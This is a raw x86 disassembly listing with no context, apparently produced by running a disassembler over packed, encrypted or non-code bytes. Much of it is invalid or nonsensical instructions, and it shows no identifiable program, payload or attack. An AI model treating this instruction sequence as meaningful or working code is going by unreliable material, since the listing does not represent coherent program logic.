  426c4a:	mov    cl,0x21
  426c4c:	out    0x85,al
  426c4e:	test   DWORD PTR [ebp-0x5eb71223],edx
  426c54:	stc    
  426c55:	icebp  
  426c56:	call   0xb8464fbb
  426c5b:	data16 lods al,BYTE PTR ds:[esi]
  426c5d:	ins    DWORD PTR es:[edi],dx
  426c5e:	sub    BYTE PTR [edx],ch
  426c60:	mov    ebx,edi
  426c62:	lock sub DWORD PTR [ecx],ebp
  426c65:	inc    eax
  426c66:	lods   al,BYTE PTR ds:[esi]
  426c67:	pop    ds
  426c68:	xor    al,BYTE PTR [ebx-0x57671535]
  426c6e:	test   eax,0x558f3f0a
  426c73:	push   eax
  426c74:	ror    DWORD PTR [esi-0x4b],0xd6
  426c78:	pop    ecx
  426c79:	imul   DWORD PTR [edi]
  426c7b:	or     edx,DWORD PTR [ecx+0x58]
  426c7e:	cwde   
  426c7f:	mov    BYTE PTR [edx-0x32],cl
  426c82:	call   0xea5:0x391d707f
  426c89:	adc    DWORD PTR [ecx],esp
  426c8b:	and    eax,0xd757fea8
  426c90:	pop    es
  426c91:	jae    0x426cb7
  426c93:	sbb    al,dl
  426c95:	add    DWORD PTR [ebp-0x3a9213c1],ebx
  426c9b:	in     eax,0x83
  426c9d:	enter  0xc4a3,0xda
  426ca1:	pop    ds
  426ca2:	mov    esp,DWORD PTR [ebx+0x53e1e132]
  426ca8:	scas   al,BYTE PTR es:[edi]
  426ca9:	dec    esp
  426caa:	add    cl,cl
  426cac:	mov    WORD PTR [ecx+ebx*1+0x73c9ec59],fs
  426cb3:	and    al,BYTE PTR [edi+edx*1+0x5520197f]
  426cba:	rcl    DWORD PTR [edi-0x28],1
  426cbd:	dec    edi
  426cbe:	xchg   ebp,eax
  426cbf:	inc    edi
  426cc0:	mov    ebx,0x594835c3
  426cc5:	mov    edx,0x5c345056
  426cca:	cli    
  426ccb:	fnstcw WORD PTR [ebp-0x4b7a6846]
  426cd1:	xor    cl,BYTE PTR [ebp+0x33228b9a]
  426cd7:	daa    
  426cd8:	sbb    dl,BYTE PTR [eax]
  426cda:	mov    ah,0x12
  426cdc:	lock pushf 
  426cde:	adc    cl,BYTE PTR [esi-0x2c]
  426ce1:	sub    dl,BYTE PTR [edi]
  426ce3:	rol    BYTE PTR [ebp-0x2b],1
  426ce6:	mov    al,0xf6
  426ce8:	and    al,0x36
  426cea:	xchg   ebp,eax
  426ceb:	stc    
  426cec:	inc    esp
  426ced:	dec    ebx
  426cee:	cld    
  426cef:	es mov edi,0x5cba29d9
  426cf5:	xchg   DWORD PTR [ebp+0x260835fc],esi
  426cfb:	sub    DWORD PTR [eax],ebx
  426cfd:	call   0x58bc:0x1b897041
  426d04:	sahf   
  426d05:	add    esi,DWORD PTR [eax+0x3c70716]
  426d0b:	dec    eax
  426d0c:	cmp    ebp,DWORD PTR [ecx+esi*2]
  426d0f:	imul   ebp,DWORD PTR [ebx],0xc7ef65d3
  426d15:	jbe    0x426d17
  426d17:	out    dx,al
  426d18:	stc    
  426d19:	call   0x5e0104f
  426d1e:	mov    eax,ds:0x462e2eae
  426d23:	cmp    eax,0x337fb598
  426d28:	pop    ss
  426d29:	inc    ecx
  426d2a:	pop    eax
  426d2b:	xor    WORD PTR [ecx],bp
  426d2e:	jmp    0x68288b1d
  426d33:	iret   
  426d34:	aam    0xc7
  426d36:	cld    
  426d37:	cwde   
  426d38:	cs leave 
  426d3a:	mov    ds:0xbf1ab5b1,al
  426d3f:	test   cl,dl
  426d41:	call   0xc9c9:0xd92ddbc7
  426d48:	mov    al,ds:0x4842a8ce
  426d4d:	add    al,BYTE PTR [esi+0x4d]
  426d50:	sub    edx,edi
  426d52:	xor    ch,dh
  426d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d55:	cmp    dh,dh
  426d57:	pop    DWORD PTR [edi]
  426d59:	xchg   edi,eax
  426d5a:	aas    
  426d5b:	not    BYTE PTR [esi-0xca1637]
  426d61:	xchg   ebx,eax
  426d62:	cwde   
  426d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d64:	(bad)  
  426d65:	jno    0x426d78
  426d67:	cmp    eax,0xcf64f26a
  426d6c:	out    0x49,eax
  426d6e:	rcl    DWORD PTR [edx+0x110438c0],0xd8
  426d75:	dec    esi
  426d76:	pop    eax
  426d77:	push   0x8848965
  426d7c:	adc    al,0x89
  426d7e:	cmp    DWORD PTR [edi],esi
  426d80:	repnz pusha 
  426d82:	int    0x3d
  426d84:	sbb    edx,DWORD PTR [esi+0x6c]
  426d87:	cli    
  426d88:	leave  
  426d89:	rol    DWORD PTR [esi+0x7a4e7025],0xe1
  426d90:	mov    gs,WORD PTR [esi]
  426d92:	push   ss
  426d93:	jb     0x426d88
  426d95:	xchg   edi,eax
  426d96:	pop    ecx
  426d97:	inc    ecx
  426d98:	or     DWORD PTR [edi+0x34f8d8dc],eax
  426d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d9f:	sbb    eax,0x67c765f8
  426da4:	adc    al,0x2a
  426da6:	into   
  426da7:	addr16 push ss
  426da9:	jnp    0x426d7b
  426dab:	(bad)  
  426dac:	mov    eax,0x3c4d80db
  426db1:	(bad)  
  426db2:	sub    eax,0x965f612a
  426db7:	mov    ecx,0x3f5eecc9
  426dbc:	rcl    BYTE PTR [ebp-0x31],cl
  426dbf:	fs int 0xeb
  426dc2:	or     eax,0x81c3277b
  426dc7:	(bad)  
  426dc8:	sbb    dh,0xe1
  426dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dcc:	leave  
  426dcd:	(bad)  
  426dce:	shr    BYTE PTR [ecx-0x48],cl
  426dd1:	daa    
  426dd2:	add    al,0x51
  426dd4:	scas   al,BYTE PTR es:[edi]
  426dd5:	xor    DWORD PTR [edi],esp
  426dd7:	jae    0x426de9
  426dd9:	xor    al,0x3e
  426ddb:	xor    al,0xf5
  426ddd:	rcr    DWORD PTR [edx-0x33],1
  426de0:	mov    WORD PTR [eax-0x5636a9b9],?
  426de6:	add    DWORD PTR [esi-0x3e],edi
  426de9:	out    dx,al
  426dea:	test   eax,0xb50a5368
  426def:	bound  esi,QWORD PTR [ecx]
  426df1:	popa   
  426df2:	inc    DWORD PTR [esi+0x1fa928f6]
  426df8:	in     al,dx
  426df9:	pop    ecx
  426dfa:	and    al,0x96
  426dfc:	hlt    
  426dfd:	xchg   edx,eax
  426dfe:	dec    ecx
  426dff:	push   esi
  426e00:	jmp    0x1e3cf1ec
  426e05:	scas   al,BYTE PTR es:[edi]
  426e06:	sar    DWORD PTR ds:0xfd47d1e6,0x46
  426e0d:	lahf   
  426e0e:	dec    ebx
  426e0f:	aad    0xa9
  426e11:	jg     0x426db5
  426e13:	ret    0x5480
  426e16:	call   0x6d25:0x38b17951
  426e1d:	pop    es
  426e1e:	(bad)  
  426e20:	pop    edx
  426e21:	inc    esi
  426e22:	xchg   esi,eax
  426e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e24:	fisubr WORD PTR [edx-0x13f6fc35]
  426e2a:	sbb    al,0x87
  426e2c:	popa   
  426e2d:	repz push DWORD PTR [ebx-0x585cb7ee]
  426e34:	out    0x21,eax
  426e36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e37:	mov    edx,ebp
  426e39:	lods   al,BYTE PTR ds:[esi]
  426e3a:	mov    ecx,0x4bb09376
  426e3f:	add    DWORD PTR [eax+0x5e],0xffffff80
  426e43:	jns    0x426dcd
  426e45:	aaa    
  426e46:	loope  0x426e87
  426e48:	sub    DWORD PTR [edi+0x204e3cd],ebp
  426e4e:	and    bl,ah
  426e50:	dec    ebp
  426e51:	mov    ds:0x62afa1fc,eax
  426e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e57:	cmc    
  426e58:	and    al,0xa
  426e5a:	adc    BYTE PTR [edi+0x2dee3b30],dl
  426e60:	lahf   
  426e61:	daa    
  426e62:	fbld   TBYTE PTR [eax+0x89c21ff]
  426e68:	cmp    eax,0xd0543f71
  426e6d:	sbb    ebp,DWORD PTR [ebx]
  426e6f:	mov    DWORD PTR [edx],0x430efb8c
  426e75:	inc    edx
  426e76:	dec    eax
  426e77:	in     eax,dx
  426e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e79:	dec    ebx
  426e7a:	(bad)  
  426e7b:	add    DWORD PTR [edx+0x465ff9a3],edx
  426e81:	ds sub cl,dl
  426e84:	cdq    
  426e85:	fs (bad) 
  426e88:	shl    ecx,0xc1
  426e8b:	xchg   edi,eax
  426e8c:	test   DWORD PTR [ecx+ebp*4+0x7d],edx
  426e90:	imul   esi,DWORD PTR [edi-0x37],0xacea5768
  426e97:	mov    eax,ds:0x65819ce5
  426e9c:	jae    0x426eec
  426e9e:	jne    0x426eaf
  426ea0:	jae    0x426ecc
  426ea2:	jp     0x426ed7
  426ea4:	add    ebx,DWORD PTR [ebx+esi*8-0x2f]
  426ea8:	pop    es
  426ea9:	fild   QWORD PTR [ecx-0x604d4d4b]
  426eaf:	ret    0x94c8
  426eb2:	icebp  
  426eb3:	lahf   
  426eb4:	retf   0x55e0
  426eb7:	pop    ecx
  426eb8:	mov    dh,0x7f
  426eba:	test   al,0x2b
  426ebc:	dec    esp
  426ebd:	sbb    esp,esp
  426ebf:	jp     0x426ec8
  426ec1:	lock jg 0x426eee
  426ec4:	rcr    ebx,cl
  426ec6:	adc    al,0x38
  426ec8:	arpl   WORD PTR [esi+0x4c2df3a2],cx
  426ece:	mov    ds:0xae960ec,al
  426ed3:	pop    edi
  426ed4:	fadd   DWORD PTR [eax]
  426ed6:	loop   0x426e63
  426ed8:	adc    esi,esi
  426eda:	xor    ch,BYTE PTR [edi]
  426edc:	pop    ds
  426edd:	hlt    
  426ede:	scas   al,BYTE PTR es:[edi]
  426edf:	push   eax
  426ee0:	loope  0x426f16
  426ee2:	mov    al,0xa0
  426ee4:	fsubr  DWORD PTR [eax-0x897f092]
  426eea:	push   cs
  426eeb:	sbb    DWORD PTR [eax+ecx*8-0x4a],ebp
  426eef:	out    dx,al
  426ef0:	lahf   
  426ef1:	xchg   esp,eax
  426ef2:	mov    edx,DWORD PTR [ebp+ecx*2+0x58dca6a7]
  426ef9:	outs   dx,BYTE PTR ds:[esi]
  426efa:	sub    DWORD PTR ds:0x19ee4cfb,esi
  426f00:	ret    0xa1b4
  426f03:	int3   
  426f04:	jg     0x426eb2
  426f06:	lock sbb eax,0xdc83b19e
  426f0c:	iret   
  426f0d:	or     eax,0xc37733b9
  426f12:	pushf  
  426f13:	call   0x672e:0x2f8b2fcb
  426f1a:	imul   ecx,DWORD PTR [ecx+eiz*1],0xfffffff3
  426f1e:	or     al,0xc2
  426f20:	enter  0x8ee5,0x2b
  426f24:	leave  
  426f25:	xlat   BYTE PTR ds:[ebx]
  426f26:	ins    BYTE PTR es:[edi],dx
  426f27:	imul   DWORD PTR [esi]
  426f29:	mov    bl,0x1f
  426f2b:	(bad)  
  426f2c:	mov    al,ds:0x55e143b3
  426f31:	dec    ecx
  426f32:	scas   eax,DWORD PTR es:[edi]
  426f33:	mov    ds:0xb2211b93,al
  426f38:	mov    al,0x7f
  426f3a:	cmp    bh,BYTE PTR [ebp-0x7000365c]
  426f40:	adc    ch,ah
  426f42:	or     BYTE PTR [edx-0x3849ce26],al
  426f48:	xlat   BYTE PTR ds:[ebx]
  426f49:	out    0x8d,eax
  426f4b:	push   eax
  426f4c:	xchg   DWORD PTR [eax],ebp
  426f4e:	push   eax
  426f4f:	xchg   esp,eax
  426f50:	push   edi
  426f51:	dec    eax
  426f52:	scas   eax,DWORD PTR es:[edi]
  426f53:	in     al,dx
  426f54:	daa    
  426f55:	popa   
  426f56:	outs   dx,BYTE PTR ds:[esi]
  426f57:	pop    ecx
  426f58:	mov    cl,BYTE PTR [edx]
  426f5a:	lock into 
  426f5c:	test   ch,al
  426f5e:	sub    edx,DWORD PTR [ebp+0x84a40d5]
  426f64:	jbe    0x426f2d
  426f66:	jno    0x426f6f
  426f68:	ror    ah,1
  426f6a:	cmp    dh,dh
  426f6c:	rcl    esi,1
  426f6e:	inc    eax
  426f6f:	mov    ecx,0x1f3d2a05
  426f74:	mov    cl,0xcd
  426f76:	or     ch,dl
  426f78:	ss jmp 0x426f97
  426f7b:	fist   WORD PTR [edx]
  426f7d:	cs mov ds,edi
  426f80:	sbb    ch,BYTE PTR [ebp-0x1d]
  426f83:	leave  
  426f84:	lea    ebx,[eax+0xcc23e5b]
  426f8a:	mov    ds:0x18185a2f,al
  426f8f:	add    eax,0x92502335
  426f94:	dec    ebp
  426f95:	pusha  
  426f96:	loopne 0x426fda
  426f98:	adc    al,0x6a
  426f9a:	cmp    BYTE PTR [ebx-0x7940d938],ah
  426fa0:	xchg   ebx,eax
  426fa1:	lahf   
  426fa2:	div    BYTE PTR [esi]
  426fa4:	jmp    0x426f6a
  426fa6:	(bad)  
  426fa7:	(bad)  
  426fa8:	std    
  426fa9:	cmc    
  426faa:	pop    ebx
  426fab:	dec    edx
  426fac:	mov    dh,0xbe
  426fae:	sbb    esi,DWORD PTR [ecx+0x21]
  426fb1:	xor    al,0x4e
  426fb3:	adc    al,0x2f
  426fb5:	adc    cl,ch
  426fb7:	sbb    DWORD PTR [edx+ebp*2+0x78],ecx
  426fbb:	in     eax,0x54
  426fbd:	add    DWORD PTR [esi-0x46],eax
  426fc0:	push   esi
  426fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fc2:	sbb    ebx,ebx
  426fc4:	lods   al,BYTE PTR ds:[esi]
  426fc5:	mov    esp,0xb19e0c97
  426fca:	push   esp
  426fcb:	pop    ecx
  426fcc:	jbe    0x426fd9
  426fce:	jl     0x427020
  426fd0:	outs   dx,DWORD PTR ds:[esi]
  426fd1:	addr16 pop esp
  426fd3:	lods   eax,DWORD PTR ds:[esi]
  426fd4:	out    dx,eax
  426fd5:	mov    WORD PTR [ebx],ds
  426fd7:	sbb    eax,0x73c662d3
  426fdc:	les    esp,FWORD PTR [esi-0x6bcb7c89]
  426fe2:	stc    
  426fe3:	aaa    
  426fe4:	sub    dl,BYTE PTR es:[eax]
  426fe7:	xchg   edx,eax
  426fe8:	fst    DWORD PTR [edx+0x6e]
  426feb:	push   esp
  426fec:	mov    ?,WORD PTR [ebp+0x4c]
  426fef:	test   eax,0xea0160d4
  426ff4:	cmp    BYTE PTR [ebx+0x71],al
  426ff7:	lods   al,BYTE PTR ds:[esi]
  426ff8:	cmp    DWORD PTR [ebx+0x53],0xcbc3c5ea
  426fff:	and    al,0x62
  427001:	xor    dh,BYTE PTR [ecx]
  427003:	fnstsw WORD PTR [edx+edx*4+0x1eb9aca]
  42700a:	xchg   DWORD PTR [esi+0x1c43368b],edi
  427010:	outs   dx,BYTE PTR ds:[esi]
  427011:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  427013:	dec    ebx
  427014:	mov    dl,0x30
  427016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427017:	mov    es,edx
  427019:	stc    
  42701a:	nop
  42701b:	sub    ecx,DWORD PTR [edx+0x72]
  42701e:	stos   DWORD PTR es:[edi],eax
  42701f:	fs inc edx
  427021:	sar    BYTE PTR [eax+eiz*2+0x30],0x12
  427026:	pop    eax
  427027:	push   0x75
  427029:	mov    ah,0x98
  42702b:	or     BYTE PTR [ebx-0x7a],0xee
  42702f:	mov    edi,0xa4f16721
  427034:	and    ecx,DWORD PTR [ebp-0x54fa83c9]
  42703a:	cmp    al,0x58
  42703c:	push   edi
  42703d:	sbb    al,0x32
  42703f:	ret    0x1faf
  427042:	lahf   
  427043:	(bad)  
  427045:	inc    ebx
  427046:	iret   
  427047:	sbb    eax,0xf12f4b1f
  42704c:	and    BYTE PTR [eax+0x356ad015],al
  427052:	dec    edx
  427053:	pop    edx
  427054:	push   es
  427055:	clc    
  427056:	std    
  427057:	adc    ebx,0x4e
  42705a:	push   esi
  42705b:	fwait
  42705c:	stc    
  42705d:	fidivr WORD PTR [esi+0x6f]
  427060:	mov    cl,0x1f
  427062:	adc    eax,0xbc169991
  427067:	pushf  
  427068:	adc    ah,BYTE PTR [eax-0x2a62e987]
  42706e:	ror    DWORD PTR [ecx+esi*1+0x14],cl
  427072:	adc    DWORD PTR [ebx-0x32],ebx
  427075:	repz pop esp
  427077:	pop    edi
  427078:	dec    edi
  427079:	push   esi
  42707a:	lds    ebx,FWORD PTR [ebp+0x5b]
  42707d:	mov    ch,0x35
  42707f:	push   cs
  427080:	call   0xeedcd2b5
  427085:	xor    al,0x17
  427087:	popa   
  427088:	dec    ebp
  427089:	fsub   QWORD PTR [ebp-0x14]
  42708c:	jl     0x4270b9
  42708e:	jecxz  0x42706d
  427090:	mov    bh,0x30
  427092:	pop    esi
  427093:	jge    0x42701a
  427095:	mov    esp,0x752cebf7
  42709a:	cld    
  42709b:	inc    ebp
  42709c:	cdq    
  42709d:	rol    DWORD PTR [ebx+edx*4-0x13],0xad
  4270a2:	in     al,0xfb
  4270a4:	dec    esp
  4270a5:	cwde   
  4270a6:	dec    esi
  4270a7:	(bad)  
  4270a8:	int    0x16
  4270aa:	add    DWORD PTR [ebp+0x65bbb607],0xffffffea
  4270b1:	xor    eax,ebx
  4270b3:	enter  0x12c1,0xe4
  4270b7:	sbb    BYTE PTR [eax],dh
  4270b9:	mov    dh,0xe5
  4270bb:	inc    ecx
  4270bc:	mov    ecx,0x912d28a
  4270c1:	scas   al,BYTE PTR es:[edi]
  4270c2:	jp     0x427092
  4270c4:	(bad)  
  4270c5:	add    DWORD PTR [esi+0x53792778],edx
  4270cb:	add    eax,DWORD PTR [ecx+0x53]
  4270ce:	pop    eax
  4270cf:	cmp    al,BYTE PTR [edi+0x6984d7ed]
  4270d5:	aad    0x8e
  4270d7:	sahf   
  4270d8:	aaa    
  4270d9:	outs   dx,BYTE PTR ds:[esi]
  4270da:	outs   dx,BYTE PTR ds:[esi]
  4270db:	adc    ebx,DWORD PTR [ebx+edx*2-0x68]
  4270df:	ss or  al,0x1d
  4270e2:	jmp    0x1940ae0c
  4270e7:	outs   dx,DWORD PTR ds:[esi]
  4270e8:	ret    
  4270e9:	adc    eax,0x94e9a70
  4270ee:	jge    0x427122
  4270f0:	and    esp,edi
  4270f2:	cwde   
  4270f3:	iret   
  4270f4:	mov    eax,0x31782d94
  4270f9:	adc    eax,0xf52aee0e
  4270fe:	hlt    
  4270ff:	jl     0x427156
  427101:	icebp  
  427102:	(bad)  
  427103:	or     eax,0x97b4bde
  427108:	xchg   edx,eax
  427109:	mov    eax,DWORD PTR [esi-0x6]
  42710c:	adc    esp,ebp
  42710e:	scas   eax,DWORD PTR es:[edi]
  42710f:	leave  
  427110:	or     eax,0xfe2339b7
  427115:	loope  0x427175
  427117:	and    edi,eax
  427119:	in     eax,dx
  42711a:	retf   
  42711b:	in     eax,0x79
  42711d:	cmp    ebp,eax
  42711f:	push   cs
  427120:	pusha  
  427121:	jle    0x4270bf
  427123:	repnz gs scas al,BYTE PTR es:[edi]
  427126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427127:	adc    DWORD PTR [edi+0x62],edx
  42712a:	xchg   esi,eax
  42712c:	mov    ah,0xeb
  42712e:	imul   BYTE PTR [ebx+0x60fd27d2]
  427134:	adc    al,0x4
  427136:	or     esp,DWORD PTR [ecx+edi*4]
  427139:	das    
  42713a:	xchg   ebp,eax
  42713b:	jle    0x4270c7
  42713d:	mov    bl,0xeb
  42713f:	dec    ecx
  427140:	mov    edi,0xedd5bd54
  427145:	dec    ebx
  427146:	into   
  427147:	mov    bl,0xc4
  427149:	and    al,0xe3
  42714b:	fcomp  QWORD PTR [ebx]
  42714d:	lds    ecx,FWORD PTR [ebp+0x55324507]
  427153:	inc    edx
  427154:	sub    eax,0xd820fb63
  427159:	pop    ecx
  42715a:	jmp    0x4271d9
  42715c:	push   ebx
  42715d:	sar    edi,0xbb
  427160:	fprem  
  427162:	call   0x3fe7da41
  427167:	sbb    eax,0x18a34cd7
  42716c:	cmp    al,0xac
  42716e:	out    0x4a,al
  427170:	jmp    0x2a1d:0x2a6981a4
  427177:	sub    BYTE PTR [ebp+0x3a],cl
  42717a:	test   DWORD PTR [edi],eax
  42717c:	jno    0x4271db
  42717e:	imul   ebx,DWORD PTR [esi+0x398fbd5c],0x337e39ed
  427188:	mov    bl,0xd0
  42718a:	pop    eax
  42718b:	lahf   
  42718c:	mov    ebx,0xecbc1533
  427191:	mov    ecx,0x5d829135
  427196:	cmp    BYTE PTR [ebx+0x49],dl
  427199:	xor    ebp,ebx
  42719b:	call   0xf83:0xd2981e79
  4271a2:	xchg   edi,eax
  4271a3:	xchg   esi,eax
  4271a4:	adc    BYTE PTR [ebp+0x2c8c8e63],bl
  4271aa:	add    DWORD PTR [ecx-0x45],eax
  4271ad:	fcomp  QWORD PTR [edx+0x7a]
  4271b0:	sub    al,0x5b
  4271b2:	cmp    ebp,DWORD PTR [bx+si+0x7a0d]
  4271b7:	xor    dl,bh
  4271b9:	rcl    DWORD PTR [edi-0x55a4a109],cl
  4271bf:	mov    ds:0x515cab46,eax
  4271c4:	retf   
  4271c5:	ret    
  4271c6:	lahf   
  4271c7:	je     0x4271d8
  4271c9:	nop
  4271ca:	mov    ebx,DWORD PTR [ecx+0x33]
  4271cd:	adc    eax,0x69417aba
  4271d2:	out    dx,eax
  4271d3:	aad    0xa9
  4271d5:	mov    ds:0x98a3338a,al
  4271da:	pop    ebp
  4271db:	test   DWORD PTR [esp+ecx*2+0x36],0x64a1cc94
  4271e3:	test   BYTE PTR [eax-0x4a],bl
  4271e6:	and    al,0x8e
  4271e8:	pop    edx
  4271e9:	fsub   DWORD PTR [ebx]
  4271eb:	sbb    BYTE PTR [ebx],cl
  4271ed:	in     eax,dx
  4271ee:	sub    ah,dh
  4271f0:	into   
  4271f1:	int    0x3a
  4271f3:	dec    esp
  4271f4:	jp     0x4271c7
  4271f6:	aas    
  4271f7:	mov    bl,0xff
  4271fa:	adc    DWORD PTR [eax+edx*8-0x6c],eax
  4271fe:	div    eax
  427200:	sbb    DWORD PTR [edi-0x35],0xffffffc0
  427204:	gs lock in eax,0x29
  427208:	or     eax,DWORD PTR [ecx-0x57]
  42720b:	and    esi,DWORD PTR [eax-0x9cf862d]
  427211:	(bad)  
  427212:	popf   
  427213:	cdq    
  427214:	cmp    BYTE PTR [edx+ebx*2-0x64],dl
  427218:	inc    ebx
  427219:	ja     0x4271d5
  42721b:	sub    bh,al
  42721d:	popa   
  42721e:	push   ds
  42721f:	outs   dx,BYTE PTR ds:[esi]
	...
  427228:	add    BYTE PTR [eax],al
  42722a:	dec    ebp
  42722b:	push   ebp
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
